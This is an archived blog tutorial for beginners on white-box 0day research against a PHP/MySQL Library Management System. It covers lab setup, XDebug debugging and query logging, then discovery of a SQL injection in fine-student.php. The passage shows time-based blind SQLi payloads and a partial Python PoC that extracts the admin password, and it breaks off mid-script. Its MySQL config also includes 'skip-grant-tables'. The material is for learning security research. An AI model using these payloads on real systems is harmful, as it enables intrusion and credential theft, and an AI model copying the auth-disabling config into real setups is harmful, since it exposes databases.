<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://0xboku.com/2021/09/14/0dayappsecBeginnerGuide.html">Original</a>
    <h1>Beginners Guide to 0day/CVE AppSec Research</h1>
    
    <div id="readability-page-1" class="page"><div>
      
        <header>
          
          
            <p><i aria-hidden="true"></i> 




  30 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p><img src="https://0xboku.com/assets/images/webwb/xdev.png" alt=""/></p>

<h3 id="blog-contributors-adeeb-shah-hyd3sec--john-jacksonjohnjhacking">Blog Contributors: <a href="https://twitter.com/hyd3sec">Adeeb Shah @hyd3sec</a> &amp; <a href="https://twitter.com/johnjhacking">John Jackson(@johnjhacking)</a></h3>


<p>A while ago I took up the challenge to get <a href="https://www.offensive-security.com/awae-oswe/">Offensive Security Web Expert (OSWE)</a> certified. During this journey I learned many awesome things. The most important lesson learned was that with source code and a debugger, I could find vulnerabilities exponentially faster than by using traditional Blackbox/Bug-Bounty methods. This made me fall in love with hunting for 0days in web applications. While pursuing the OSWE, I took a very unorthodox approach. I read through the materials over, and over, and over, and over again. I took the methods that OffSec taught me, and rather than completing the coursework, I applied them to the real world.</p>

<p>This was one of the best things I ever did, and (with allot of luck) lead me to some awesome personal accomplishments:</p>
<ul>
  <li>Exploit research featured in Hack the Box Buff Box (Thanks Shaun!)</li>
  <li>Exploit research featured in DEFCON Safe-Mode 2020</li>
  <li>Exploit research featured in Offensive Security Proving Grounds</li>
  <li>10+ Web Application Exploits published on Exploit-DB</li>
  <li>20+ CVE’s</li>
  <li>0-day discoveries</li>
  <li>Critical vulnerabilities in private programs</li>
</ul>

<p>My real-world web application xDev &amp; security research started by setting up easy PHP web applications and conducting “free” Whitebox pen tests against them. When I’d find something, I’d write it up and ship it out to anywhere that would publish it. As I continued this journey, I progressed to harder and harder targets. My hope is that someone will find this blog post useful, and it will help them step into the world of security research and exploit development!!</p>


<p>To start honing our Whitebox pentest skills, we’ll want an app which is easy to setup, and has some guaranteed vulns. Setting up the security research environment can be half the battle; best to take a walk, run approach. There are many websites online where developers publish and share their projects as they hone their dev skills. These websites, like SourceCodester.com, are great choices for stepping into the world of Whitebox web application pentesting.</p>

<h2 id="discovering-a-target-application">Discovering a Target Application</h2>
<p>Web applications written in PHP with a MySQL backend are typically easy to setup. We’ll go to SourceCodester.com and hunt for a juicy target app.</p>

<p><img src="https://0xboku.com/assets/images/webwb/sourcecodesterHP.png" alt=""/></p>

<p>While browsing through the PHP Projects, we discover what looks to be like a juicy PHP/MySQL application “<a href="https://www.sourcecodester.com/php/12469/library-management-system-using-php-mysql.html">Library Management System Using PHP and MySQL with Source Code</a>”. On the application info page, we see that there are instructions on how to run the application.</p>

<p><img src="https://0xboku.com/assets/images/webwb/appsetup.png" alt=""/></p>

<p>After reviewing the setup installation steps, we decide that setup will be trivial and this will be our target app. We download the application to our Kali box and begin the application setup.</p>
<ul>
  <li><a href="https://www.sourcecodester.com/sites/default/files/download/oretnom23/librarymanagement.zip">Download Link - Library Management System Using PHP and MySQL with Source Code</a></li>
</ul>

<p>Then we extract the ZIP file to our home path.</p>

<div><div><pre><code><span>mkdir </span>libraryApp <span>&amp;&amp;</span> <span>cd </span>libraryApp/       
curl <span>-o</span> librarymanagement.zip https://www.sourcecodester.com/sites/default/files/download/oretnom23/librarymanagement.zip    
unzip librarymanagement.zip    
</code></pre></div></div>


<p>Kali Linux typically has Apache installed out of the box. If Apache is not installed, then use the <code>apt</code> package management tool to install apache.</p>

<div><div><pre><code><span>sudo </span>apt update
<span>sudo </span>apt upgrade
<span>sudo </span>apt <span>install </span>apache2
</code></pre></div></div>

<p>Move or delete existing files in the <code>/var/www/html/</code> directory. Then move the unzipped files there.</p>
<div><div><pre><code><span>sudo rm</span> <span>-r</span> /var/www/html/<span>*</span>
<span>sudo mv </span>LibraryManagement/ /var/www/html/
</code></pre></div></div>

<p>Start the MySQL service on your kali box.</p>
<div><div><pre><code><span>sudo </span>systemctl start mysql.service
</code></pre></div></div>

<p>Access the MySQL CLI as <code>root</code>.</p>
<div><div><pre><code><span># login to the MySQL service using as root user or by using sudo.</span>
<span># The default username password for a fresh MySQL </span>
<span>#   service on kali is user &#39;root&#39; with password as nothing (blank)</span>
<span>sudo </span>mysql <span>-u</span> root
</code></pre></div></div>

<ul>
  <li>Create a database named <code>library_db</code>.
    <div><div><pre><code>MariaDB <span>[(</span>none<span>)]&gt;</span> CREATE DATABASE library_db<span>;</span>
MariaDB <span>[(</span>none<span>)]&gt;</span> show databases<span>;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| library_db         |
| mysql              |
| performance_schema |
+--------------------+
<span># CTRL+C to exit and get back to a normal bash terminal</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>Import that SQL file from the PHP app into the newly created <code>library_db</code> database.</p>
<div><div><pre><code><span>cd</span> /var/www/html/LibraryManagement/
<span>sudo </span>mysql <span>-u</span> root <span>-p</span> library_db &lt; library_db.sql
<span># Check that the DB imported correctly by viewing the tables</span>
<span>sudo </span>mysql <span>-u</span> root
MariaDB <span>[(</span>none<span>)]&gt;</span> show databases<span>;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| library_db         |
| mysql              |
| performance_schema |
+--------------------+
MariaDB <span>[(</span>none<span>)]&gt;</span> use library_db<span>;</span>
MariaDB <span>[</span>library_db]&gt; show tables<span>;</span>
+----------------------+
| Tables_in_library_db |
+----------------------+
| admin                |
| books                |
| borrow               |
| news                 |
| students             |
+----------------------+
</code></pre></div></div>

<p>Start the Apache web server.</p>
<div><div><pre><code><span>sudo </span>systemctl start apache2.service
</code></pre></div></div>
<ul>
  <li>By default the webserver will be on localhost.</li>
</ul>

<p>Go to <code>http://localhost/LibraryManagement/</code> in your browser.</p>
<ul>
  <li>We will notice that the images are not loading. This is because Windows folder and file naming is case insensitive, whereas Linux is case sensitive. The developer created the <code>/Ify/</code> folder with a capital <code>I</code>. To fix this problem for Linux, we simply change the name of the folder to lowercase.
    
  </li>
</ul>

<p>Returning to the website after making our fix, we will see the home page with the images rendering:</p>

<p><img src="https://0xboku.com/assets/images/webwb/targetHomepage.png" alt=""/></p>


<p>With the Apache server is running our target application, we’ll setup our VSCode debugger.</p>

<h2 id="vscode-installation-on-kali-linux">VSCode Installation on Kali Linux</h2>
<p>On our Kali VM we will <a href="https://code.visualstudio.com/">download the Debian package of VSCode</a>.</p>

<p><img src="https://0xboku.com/assets/images/webwb/dlVSCode.png" alt=""/></p>

<p>Install the VSCode Debian file using <code>dpkg</code>.</p>

<div><div><pre><code><span>cd</span> ~/Downloads/
dpkg <span>-i</span> code_1.60.1-1631294805_amd64.deb
</code></pre></div></div>

<h2 id="vscode-php-debug-extension-installation">VSCode PHP Debug Extension Installation</h2>
<p>Open VSCode. Select the <code>Extensions</code> tab from the left, search for the <code>PHP Debug</code> extension, and then install it.</p>

<p><img src="https://0xboku.com/assets/images/webwb/phpDbg.png" alt=""/></p>

<p>Select the <code>Explorer</code> tab from the left, click the <code>Open Folder</code> button, and select the <code>/var/www/html/LibraryManagement/</code> folder.</p>

<p>We are now able to see the applications PHP code within the VSCode Explorer:</p>

<p><img src="https://0xboku.com/assets/images/webwb/seeCode.png" alt=""/></p>

<h2 id="launchjson-debugging-config-file-creation"><code>launch.json</code> Debugging Config File Creation</h2>
<p>From the <code>Explorer</code> select the <code>index.php</code> file. Then select the <code>Run and Debug</code> tab from the left, and under the <code>Run and Debug</code> button click the <code>create a launch.json file</code> hyperlink.</p>

<ul>
  <li>If you have an issue with creating a <code>launch.json</code> file, it may be permissions related.
    <div><div><pre><code><span># fix permissions issue</span>
<span>chown</span> <span>-R</span> kali:kali /var/www/html/
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="default-launchjson-config-file">Default <code>launch.json</code> Config File</h3>
<p>The default JSON config file should work out of the box for us. The port <code>9003</code> is the default XDebug port for version 3.X.</p>
<div><div><pre><code><span>{</span><span>
    </span><span>//</span><span> </span><span>Use</span><span> </span><span>IntelliSense</span><span> </span><span>to</span><span> </span><span>learn</span><span> </span><span>about</span><span> </span><span>possible</span><span> </span><span>attributes.</span><span>
    </span><span>//</span><span> </span><span>Hover</span><span> </span><span>to</span><span> </span><span>view</span><span> </span><span>descriptions</span><span> </span><span>of</span><span> </span><span>existing</span><span> </span><span>attributes.</span><span>
    </span><span>//</span><span> </span><span>For</span><span> </span><span>more</span><span> </span><span>information</span><span>,</span><span> </span><span>visit:</span><span> </span><span>https://go.microsoft.com/fwlink/?linkid=</span><span>830387</span><span>
    </span><span>&#34;version&#34;</span><span>:</span><span> </span><span>&#34;0.2.0&#34;</span><span>,</span><span>
    </span><span>&#34;configurations&#34;</span><span>:</span><span> </span><span>[</span><span>
        </span><span>{</span><span>
            </span><span>&#34;name&#34;</span><span>:</span><span> </span><span>&#34;Listen for Xdebug&#34;</span><span>,</span><span>
            </span><span>&#34;type&#34;</span><span>:</span><span> </span><span>&#34;php&#34;</span><span>,</span><span>
            </span><span>&#34;request&#34;</span><span>:</span><span> </span><span>&#34;launch&#34;</span><span>,</span><span>
            </span><span>&#34;port&#34;</span><span>:</span><span> </span><span>9003</span><span>
        </span><span>},</span><span>
        </span><span>{</span><span>
            </span><span>&#34;name&#34;</span><span>:</span><span> </span><span>&#34;Launch currently open script&#34;</span><span>,</span><span>
            </span><span>&#34;type&#34;</span><span>:</span><span> </span><span>&#34;php&#34;</span><span>,</span><span>
            </span><span>&#34;request&#34;</span><span>:</span><span> </span><span>&#34;launch&#34;</span><span>,</span><span>
            </span><span>&#34;program&#34;</span><span>:</span><span> </span><span>&#34;${file}&#34;</span><span>,</span><span>
            </span><span>&#34;cwd&#34;</span><span>:</span><span> </span><span>&#34;${fileDirname}&#34;</span><span>,</span><span>
            </span><span>&#34;port&#34;</span><span>:</span><span> </span><span>0</span><span>,</span><span>
            </span><span>&#34;runtimeArgs&#34;</span><span>:</span><span> </span><span>[</span><span>
                </span><span>&#34;-dxdebug.start_with_request=yes&#34;</span><span>
            </span><span>],</span><span>
            </span><span>&#34;env&#34;</span><span>:</span><span> </span><span>{</span><span>
                </span><span>&#34;XDEBUG_MODE&#34;</span><span>:</span><span> </span><span>&#34;debug,develop&#34;</span><span>,</span><span>
                </span><span>&#34;XDEBUG_CONFIG&#34;</span><span>:</span><span> </span><span>&#34;client_port=${port}&#34;</span><span>
            </span><span>}</span><span>
        </span><span>},</span><span>
        </span><span>{</span><span>
            </span><span>&#34;name&#34;</span><span>:</span><span> </span><span>&#34;Launch Built-in web server&#34;</span><span>,</span><span>
            </span><span>&#34;type&#34;</span><span>:</span><span> </span><span>&#34;php&#34;</span><span>,</span><span>
            </span><span>&#34;request&#34;</span><span>:</span><span> </span><span>&#34;launch&#34;</span><span>,</span><span>
            </span><span>&#34;runtimeArgs&#34;</span><span>:</span><span> </span><span>[</span><span>
                </span><span>&#34;-dxdebug.mode=debug&#34;</span><span>,</span><span>
                </span><span>&#34;-dxdebug.start_with_request=yes&#34;</span><span>,</span><span>
                </span><span>&#34;-S&#34;</span><span>,</span><span>
                </span><span>&#34;localhost:0&#34;</span><span>
            </span><span>],</span><span>
            </span><span>&#34;program&#34;</span><span>:</span><span> </span><span>&#34;&#34;</span><span>,</span><span>
            </span><span>&#34;cwd&#34;</span><span>:</span><span> </span><span>&#34;${workspaceRoot}&#34;</span><span>,</span><span>
            </span><span>&#34;port&#34;</span><span>:</span><span> </span><span>9003</span><span>,</span><span>
            </span><span>&#34;serverReadyAction&#34;</span><span>:</span><span> </span><span>{</span><span>
                </span><span>&#34;pattern&#34;</span><span>:</span><span> </span><span>&#34;Development Server </span><span>\\</span><span>(http://localhost:([0-9]+)</span><span>\\</span><span>) started&#34;</span><span>,</span><span>
                </span><span>&#34;uriFormat&#34;</span><span>:</span><span> </span><span>&#34;http://localhost:%s&#34;</span><span>,</span><span>
                </span><span>&#34;action&#34;</span><span>:</span><span> </span><span>&#34;openExternally&#34;</span><span>
            </span><span>}</span><span>
        </span><span>}</span><span>
    </span><span>]</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<h2 id="php-xdebug-installation">PHP-XDebug Installation</h2>
<p>Now that we have VSCode setup with the PHP debugging extension, we will install the PHP XDebug package on our Kali Linux system. This will allow Apache, which is running the PHP code engine, to interface with our VSCode session for debugging.</p>

<div><div><pre><code><span>sudo </span>apt <span>install </span>php-xdebug <span>-y</span>
</code></pre></div></div>

<h2 id="php-configuration-file-modification">PHP Configuration File Modification</h2>
<p>Since we are using Apache, we will be modifying the PHP config file for Apache.</p>
<ul>
  <li>Change directory to the <code>/etc/php/{Version}/apache2/</code> folder.</li>
  <li>Open the <code>php.ini</code> file with a text editor, add the following to the bottom, and save:</li>
</ul>

<div><div><pre><code><span>[</span>xdebug]
xdebug.mode <span>=</span> debug
xdebug.start_with_request <span>=</span> <span>yes
</span>xdebug.idekey <span>=</span> VSCODE
xdebug.client_port <span>=</span> 9003
xdebug.client_host <span>=</span> <span>&#34;127.0.0.1&#34;</span>
xdebug.discover_client_host  <span>=</span> 1
xdebug.log<span>=</span><span>&#34;/tmp/xdebug.log&#34;</span>
xdebug.cli_color <span>=</span> 1
</code></pre></div></div>

<p>Some blog posts that may help you if you get stuck:</p>
<ul>
  <li><a href="https://gist.github.com/odan/1abe76d373a9cbb15bed">Installing Xdebug for XAMPP</a></li>
  <li><a href="https://technex.us/2020/06/installing-xdebug-on-anything-for-vscode-in-5-minutes/">Installing XDebug on anything for VSCode in 5 minutes</a></li>
</ul>

<h2 id="restart-apache-service">Restart Apache Service</h2>
<p>With the changes made to the Apache PHP configuration, restart the Apache2 service using Systemd.</p>

<div><div><pre><code><span>sudo </span>systemctl restart apache2.service
</code></pre></div></div>

<h2 id="set-debugging-breakpoint">Set Debugging Breakpoint</h2>
<p>Now our Apache PHP engine should connect and communicate with our VSCode session for live debugging. To test that we’ve done everything correctly, we will open the <code>index.php</code> file in VSCode and set a breakpoint on the first valid PHP code line in the file. To set a breakpoint we will select line <code>11: require &#39;includes/snippet.php&#39;;</code> and press <code>F9</code>.</p>

<p><img src="https://0xboku.com/assets/images/webwb/11BP.png" alt=""/></p>

<h2 id="breaking-on-that-bp">Breaking on that BP</h2>
<p>With our breakpoint set, we will start our debugging session by click the green play button from the <code>Run and Debug</code> tab or by pressing <code>F5</code>.</p>

<p>To trigger the breakpoint, we’ll go to <code>http://localhost/LibraryManagement/index.php</code> in our browser.</p>

<p>Tabbing back to the VSCode window, we will see that we’ve hit our breakpoint in the debugger.</p>

<p><img src="https://0xboku.com/assets/images/webwb/hitBP.png" alt=""/></p>

<h2 id="vscode-php-code-intelligence-setup">VSCode PHP Code Intelligence Setup</h2>
<p>At this point we have the application, backend database, webserver debugging extension, and VSCode debugger setup and functional. Now we will be diving into debugging the code to discover security vulnerabilities. While performing a Whitebox pentest, you will need to discover what the functions in the code are. Once we understand what the functions and code are doing, we can then attempt to exploit it. Rather than flipping back and forth between our debugger and PHP documentation, we will install the PHP Code Intelligence extension for VSCode.</p>

<p>In VSCode, go to the <code>Extensions</code> and install <code>PHP Intelephense</code>.</p>

<p><img src="https://0xboku.com/assets/images/webwb/phpintelExt.png" alt=""/></p>

<p>With PHP Intelephense we can simply hover over PHP functions to see how they work, peek their definitions, or jump to where they are defined within the code.</p>

<h4 id="hover-to-see-function-definition">Hover to see function definition:</h4>
<p><img src="https://0xboku.com/assets/images/webwb/funcDef.png" alt=""/></p>

<h4 id="right-click-to-jump-to-function-definition">Right-Click to jump to function definition:</h4>
<p><img src="https://0xboku.com/assets/images/webwb/jump2def.png" alt=""/></p>
<h4 id="viewing-the-sanitize-functions-source-code">Viewing the <code>sanitize()</code> functions source code:</h4>
<p><img src="https://0xboku.com/assets/images/webwb/funcdefSanitize.png" alt=""/></p>


<p>With debugging setup, we will now enable SQL query logging. This will come in very handy when we are attempting to exploit SQL Injection vulnerabilities.</p>

<h2 id="modify-mysql-config">Modify MySQL Config</h2>
<p>To enable SQL query logging we will add the below to the <code>/etc/mysql/my.cnf</code> MySQL configuration file:</p>

<div><div><pre><code><span>[</span>mysqld]
general_log <span>=</span> on
<span>general_log_file</span><span>=</span>/var/log/mysql/mysql.log
skip-grant-tables
</code></pre></div></div>

<p>Next, we will restart the MySQL service with Systemd to apply our changes:</p>

<div><div><pre><code><span>sudo </span>systemctl restart mysql
</code></pre></div></div>

<h2 id="streaming-mysql-log-output">Streaming MySQL Log Output</h2>
<p>With MySQL logging enabled, we will <code>tail</code> the file and use the <code>-f</code> flag to continuously stream the output.</p>

<div><div><pre><code><span>sudo tail</span> <span>-f</span> /var/log/mysql/mysql.log
</code></pre></div></div>

<p>Now that we have SQL Query logging, we will visit the <code>login.php</code> page and submit credentials. We are able to see the backend SQL query that executes on the server live via our terminal window:</p>

<p><img src="https://0xboku.com/assets/images/webwb/dbStreaming.png" alt=""/></p>


<p>We are finally to the fun part, Vulnerability Hunting! When searching for vulnerabilities we will start with the user-input, trace it source to sink, and follow the code to see if there is suspicious code. Once we find some suspect code that looks vulnerable, then we will use our setup to attempt to exploit it.</p>

<h2 id="searching-for-post-params">Searching for Post Params</h2>
<p>Using VSCode, we will search for <code>$_POST[</code>. We will be looking for POST parameters which are not passed to the <code>sanitized()</code> function.</p>

<h2 id="discovering-sql-injection">Discovering SQL Injection</h2>
<p>Our first hunt returns successful! We see that the <code>id</code> parameter in the POST request to the <code>fine-student.php</code> webpage does not sanitize the user-input before passing it to the MySQL database! We see that the SQL Injection affects both a <code>SELECT</code> &amp; <code>UPDATE</code> query!</p>

<p><img src="https://0xboku.com/assets/images/webwb/injectionPoints.png" alt=""/></p>

<p>We see that to hit the vulnerable code branch we will first need to supply the <code>check</code> POST parameter:</p>

<p><img src="https://0xboku.com/assets/images/webwb/cbranch.png" alt=""/></p>

<p>We setup our SQL injection request in BurpSuite:</p>

<p><img src="https://0xboku.com/assets/images/webwb/bs1.png" alt=""/></p>

<p>In the VSCode debugger we set a breakpoint on <code>line 22</code> of the <code>fine-student.php</code> file. We then send our burp request to trigger the breakpoint.</p>

<p>Once we hit the breakpoint, we walk through the code using <code>F10</code> to <code>Step Over</code> the code. This means that we will execute the lines sequentially in front of us, but we will not <code>Step Into</code> things like functions which would jump us to different sections of code.</p>

<p>Once we get to line 40, we can hover over the <code>$query</code> and see what the SQL query is in the applications memory:</p>

<p><img src="https://0xboku.com/assets/images/webwb/walkCode.png" alt=""/></p>

<p>Looks allot like SQL Injection!</p>

<p>Next we will change up the payload to a URL-encoded:</p>

<div><div><pre><code>inject&#39; AND 1337=31337 union all select &#34;HelloFriend&#34; -- kamahamaha
</code></pre></div></div>

<p><img src="https://0xboku.com/assets/images/webwb/injection.png" alt=""/></p>


<p>In this section we will exploit the discovered blind SQL injection and write a python exploit.</p>

<h2 id="cant-write-a-webshell">Can’t Write a Webshell</h2>
<p>If we were to have hosted this on Windows, we could simply inject into the <code>SELECT</code> statement and write a PHP webshell to the file system. Trying this in the MySQL CLI, we can see that on Linux this will not work. The <code>mysql</code> user does not have permissions to write to the Apache web servers path by default:</p>

<p><img src="https://0xboku.com/assets/images/webwb/sqlError.png" alt=""/></p>

<h2 id="looks-like-sleep-based-blind-sql-it-is">Looks Like Sleep Based Blind SQL it is!</h2>
<p>Since we cannot write a webshell for RCE, we will use this SQL Injection vulnerability to dump the data within the database. We’ll use our injection point to inject <code>UNION SELECT</code> statements that will read the admins password.</p>

<p>After testing our payload in BurpSuite, we discover that there is no difference in the server response based on our SQL Injection. If the responses contained the result of the SQL query, we could trivially dump the tables in the servers response. After investigating the code we see that the result of the SQL query is never injected into the HTML response, and does not differ based on SQL errors. Therefor we will use Time-Based Blind SQL Injection to exploit this vulnerability!</p>

<h2 id="looking-in-the-back-of-the-book-for-sql-answers">Looking in “the back of the book” for SQL Answers</h2>
<p>We save some time, and just use the MySQL CLI to enumerate what the admin credentials table name is, and what the columns are:</p>

<p><img src="https://0xboku.com/assets/images/webwb/enumAdminTable.png" alt=""/></p>

<p>We see that the admin credential table is named <code>admin</code> and the passwords are stored in the <code>password</code> column. The admin’s usernames are stored in the <code>adminName</code> column.</p>

<p>At this point we know that our injection statement looks like this:</p>

<div><div><pre><code><span>SELECT</span> <span>returnDate</span> <span>from</span> <span>borrow</span> <span>where</span> <span>borrowId</span> <span>=</span> <span>&#39;{INJECTION}&#39;</span><span>;</span>
</code></pre></div></div>

<p>We also see that the injectable query returns only 1 column <code>returnDate</code> from the <code>borrow</code> table. Therefor our <code>UNION SELECT</code> must also only return 1 column. For good practice, we will make sure that our <code>borrowId</code> injection parameter is false so only 1 value is returned.</p>

<h2 id="sleep-for-passwords">Sleep for Passwords</h2>

<p>We will use an <code>IF()</code> statement in our union query to check if we discovered the target character of the admins password. If we did guess the charater of the admins password correctly, the SQL database will sleep for 1 second.</p>

<p>Our Blind SQL Injection payload to read administrators password so far:</p>

<div><div><pre><code><span>SELECT</span> <span>returnDate</span> <span>from</span> <span>borrow</span> <span>where</span> <span>borrowId</span> <span>=</span> <span>&#39;inject&#39;</span> <span>UNION</span> <span>SELECT</span> <span>IF</span><span>(</span><span>SUBSTRING</span><span>(</span><span>password</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span> <span>=</span> <span>&#39;{CHAR-WE-ARE-GUESSING}&#39;</span><span>,</span><span>sleep</span><span>(</span><span>1</span><span>),</span><span>null</span><span>)</span> <span>FROM</span> <span>admin</span> <span>WHERE</span> <span>adminId</span><span>=</span><span>1</span><span>;</span>
</code></pre></div></div>

<p>When we guess that the first letter of the password for admin #1 is <code>2</code>, the response is returned in <code>0.001</code> seconds.</p>

<p>When we guess that the first letter of the password for admin #1 is <code>1</code>, the response is returned in <code>1.001</code> seconds. Using this method we can enumerate all the charaters of the admins password.</p>

<p><img src="https://0xboku.com/assets/images/webwb/blindtimeguess.png" alt=""/></p>

<h2 id="testing-our-sleep-payload-in-burpsuite">Testing our Sleep Payload in BurpSuite</h2>

<p>Testing our payload in BurpSuite, we experience the same thing, a 1 second delay when we guess the first character of the admins password correctly:</p>

<p><img src="https://0xboku.com/assets/images/webwb/1secDelay.png" alt=""/></p>

<h2 id="simple-poc-to-exploit-sleep-for-answers">Simple PoC To Exploit Sleep for Answers</h2>
<p>We know all information points to build our exploit. First we’ll build and test that our exploit can determine when we hit a sleep (the right character).</p>

<p>This is the PoC I Built:</p>

<div><div><pre><code><span>import</span> <span>requests</span>
<span>from</span> <span>colorama</span> <span>import</span> <span>Fore</span> <span>as</span> <span>F</span>
<span>from</span> <span>colorama</span> <span>import</span> <span>Back</span> <span>as</span> <span>B</span>
<span>from</span> <span>colorama</span> <span>import</span> <span>Style</span> <span>as</span> <span>S</span>
<span>requests</span><span>.</span><span>packages</span><span>.</span><span>urllib3</span><span>.</span><span>disable_warnings</span><span>(</span><span>requests</span><span>.</span><span>packages</span><span>.</span><span>urllib3</span><span>.</span><span>exceptions</span><span>.</span><span>InsecureRequestWarning</span><span>)</span>
<span>proxies</span>         <span>=</span> <span>{</span><span>&#39;http&#39;</span><span>:</span><span>&#39;http://127.0.0.1:8080&#39;</span><span>,</span><span>&#39;https&#39;</span><span>:</span><span>&#39;http://127.0.0.1:8080&#39;</span><span>}</span>

<span># POST /LibraryManagement/fine-student.php
# inject&#39; UNION SELECT IF(SUBSTRING(password,1,1) = &#39;1&#39;,sleep(1),null) FROM admin WHERE adminId=1; -- kamahamaha
</span><span>def</span> <span>sqliPayload</span><span>(</span><span>char</span><span>,</span><span>position</span><span>,</span><span>userid</span><span>,</span><span>column</span><span>,</span><span>table</span><span>):</span>
    <span>sqli</span>  <span>=</span> <span>&#39;inject</span><span>\&#39;</span><span> UNION SELECT IF(SUBSTRING(&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>column</span><span>)</span><span>+</span><span>&#39;,&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>position</span><span>)</span><span>+</span><span>&#39;,1) = </span><span>\&#39;</span><span>&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>char</span><span>)</span><span>+</span><span>&#39;</span><span>\&#39;</span><span>,sleep(2),null) FROM &#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>table</span><span>)</span><span>+</span><span>&#39; WHERE adminId=&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>userid</span><span>)</span><span>+</span><span>&#39;; -- kamahamaha&#39;</span>
    <span>return</span> <span>sqli</span>

<span>chars</span> <span>=</span> <span>[</span> <span>&#39;a&#39;</span><span>,</span><span>&#39;b&#39;</span><span>,</span><span>&#39;c&#39;</span><span>,</span><span>&#39;d&#39;</span><span>,</span><span>&#39;e&#39;</span><span>,</span><span>&#39;f&#39;</span><span>,</span><span>&#39;g&#39;</span><span>,</span><span>&#39;h&#39;</span><span>,</span><span>&#39;i&#39;</span><span>,</span><span>&#39;j&#39;</span><span>,</span><span>&#39;k&#39;</span><span>,</span><span>&#39;l&#39;</span><span>,</span><span>&#39;m&#39;</span><span>,</span><span>&#39;n&#39;</span><span>,</span><span>&#39;o&#39;</span><span>,</span>
          <span>&#39;p&#39;</span><span>,</span><span>&#39;q&#39;</span><span>,</span><span>&#39;r&#39;</span><span>,</span><span>&#39;s&#39;</span><span>,</span><span>&#39;t&#39;</span><span>,</span><span>&#39;u&#39;</span><span>,</span><span>&#39;v&#39;</span><span>,</span><span>&#39;w&#39;</span><span>,</span><span>&#39;x&#39;</span><span>,</span><span>&#39;y&#39;</span><span>,</span><span>&#39;z&#39;</span><span>,</span><span>&#39;A&#39;</span><span>,</span><span>&#39;B&#39;</span><span>,</span><span>&#39;C&#39;</span><span>,</span><span>&#39;D&#39;</span><span>,</span>
          <span>&#39;E&#39;</span><span>,</span><span>&#39;F&#39;</span><span>,</span><span>&#39;G&#39;</span><span>,</span><span>&#39;H&#39;</span><span>,</span><span>&#39;I&#39;</span><span>,</span><span>&#39;J&#39;</span><span>,</span><span>&#39;K&#39;</span><span>,</span><span>&#39;L&#39;</span><span>,</span><span>&#39;M&#39;</span><span>,</span><span>&#39;N&#39;</span><span>,</span><span>&#39;O&#39;</span><span>,</span><span>&#39;P&#39;</span><span>,</span><span>&#39;Q&#39;</span><span>,</span><span>&#39;R&#39;</span><span>,</span><span>&#39;S&#39;</span><span>,</span>
          <span>&#39;T&#39;</span><span>,</span><span>&#39;U&#39;</span><span>,</span><span>&#39;V&#39;</span><span>,</span><span>&#39;W&#39;</span><span>,</span><span>&#39;X&#39;</span><span>,</span><span>&#39;Y&#39;</span><span>,</span><span>&#39;Z&#39;</span><span>,</span><span>&#39;0&#39;</span><span>,</span><span>&#39;1&#39;</span><span>,</span><span>&#39;2&#39;</span><span>,</span><span>&#39;3&#39;</span><span>,</span><span>&#39;4&#39;</span><span>,</span><span>&#39;5&#39;</span><span>,</span><span>&#39;6&#39;</span><span>,</span><span>&#39;7&#39;</span><span>,</span>
          <span>&#39;8&#39;</span><span>,</span><span>&#39;9&#39;</span><span>,</span><span>&#39;@&#39;</span><span>,</span><span>&#39;#&#39;</span><span>]</span>

<span>def</span> <span>postRequest</span><span>(</span><span>URL</span><span>,</span><span>sqliReq</span><span>,</span><span>char</span><span>,</span><span>position</span><span>):</span>
    <span>sqliURL</span> <span>=</span> <span>URL</span>
    <span>params</span> <span>=</span> <span>{</span><span>&#34;check&#34;</span><span>:</span><span>1</span><span>,</span><span>&#34;id&#34;</span><span>:</span><span>sqliReq</span><span>}</span>
    <span>req</span>     <span>=</span> <span>requests</span><span>.</span><span>post</span><span>(</span><span>url</span><span>=</span><span>sqliURL</span><span>,</span> <span>data</span><span>=</span><span>params</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>,</span> <span>proxies</span><span>=</span><span>proxies</span><span>,</span><span>timeout</span><span>=</span><span>10</span><span>)</span>
    <span>print</span><span>(</span><span>&#34;{} : {}&#34;</span><span>.</span><span>format</span><span>(</span><span>char</span><span>,</span><span>req</span><span>.</span><span>elapsed</span><span>.</span><span>total_seconds</span><span>()))</span>

<span>def</span> <span>theHarvester</span><span>(</span><span>target</span><span>,</span><span>CHARS</span><span>,</span><span>url</span><span>):</span>
    <span>print</span><span>(</span><span>&#34;Retrieving: {} {} {}&#34;</span><span>.</span><span>format</span><span>(</span><span>target</span><span>[</span><span>&#39;table&#39;</span><span>],</span><span>target</span><span>[</span><span>&#39;column&#39;</span><span>],</span><span>target</span><span>[</span><span>&#39;id&#39;</span><span>]))</span>
    <span>position</span> <span>=</span> <span>1</span>
    <span>theHarvest</span> <span>=</span> <span>&#34;&#34;</span>
    <span>while</span> <span>position</span> <span>&lt;</span> <span>5</span><span>:</span>
        <span>for</span> <span>char</span> <span>in</span> <span>CHARS</span><span>:</span>
            <span>sqliReq</span> <span>=</span> <span>sqliPayload</span><span>(</span><span>char</span><span>,</span><span>position</span><span>,</span><span>target</span><span>[</span><span>&#39;id&#39;</span><span>],</span><span>target</span><span>[</span><span>&#39;column&#39;</span><span>],</span><span>target</span><span>[</span><span>&#39;table&#39;</span><span>])</span>
            <span>postRequest</span><span>(</span><span>url</span><span>,</span><span>sqliReq</span><span>,</span><span>char</span><span>,</span><span>position</span><span>)</span>
        <span>position</span> <span>+=</span> <span>1</span>
    <span>return</span> <span>theHarvest</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>&#34;__main__&#34;</span><span>:</span>
